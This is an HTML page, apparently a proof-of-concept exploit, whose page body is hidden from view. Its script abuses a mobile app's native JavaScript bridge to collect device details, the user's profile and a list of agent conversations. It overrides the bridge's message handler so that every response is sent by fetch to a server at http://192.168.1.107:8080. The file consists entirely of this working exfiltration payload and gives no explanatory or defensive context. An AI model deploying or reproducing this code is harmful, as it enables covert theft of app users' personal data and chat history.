<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 0;
            overflow: hidden;  /* 完全隐藏页面内容 */
        }
    </style>
</head>
<body>
    <script>
        (function init() {
            // 修改后的通用请求方法
            const makeRequest = (method, params) => {
                try {
                    if (method === 'request') {
                        const reqData = params === 'userInfo' 
                            ? {
                                path: "api/getuserinfo",
                                method: "GET",
                                data: "{}",
                                header: "{}"
                              }
                            : {
                                path: "api/user/agent/conversation/list",
                                method: "POST",
                                data: JSON.stringify({
                                    agentId: "naQivTmsDa",
                                    offset: 0,
                                    limit: 40,
                                    filterGoodQuestion: true
                                }),
                                header: "{}"
                              };
                        window.JsRuntime.invoke('request', JSON.stringify(reqData), Date.now());
                    } else {
                        window.JsRuntime.invoke(method, '{}', `auto_${Date.now()}`);
                    }
                } catch (error) {
                    sendToServer({ error: error.message, method });
                }
            };

            // 初始化时执行所有请求
            ['getAppVersion', 'getDeviceInfo', 'userInfo', 'history'].forEach(method => {
                setTimeout(() => {  // 添加微小延时避免请求拥堵
                    if (method === 'userInfo' || method === 'history') {
                        makeRequest('request', method);
                    } else {
                        makeRequest(method);
                    }
                }, method === 'getAppVersion' ? 0 : 50);
            });

            // 网络传输方法
            window.jsb = {
                handleMessage: response => {
                    const payload = {
                        timestamp: new Date().toISOString(),
                        type: 'jsb_response',
                        data: response
                    };
                    sendToServer(payload);
                }
            };

            function sendToServer(data) {
                const errorPayload = { 
                    timestamp: new Date().toISOString(),
                    type: 'client_error',
                    data 
                };
                
                fetch('http://192.168.1.107:8080', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data.error ? errorPayload : data)
                }).catch(error => {
                    console.error('最终错误捕获:', error);
                });
            }
        })();
    </script>
</body>
</html>
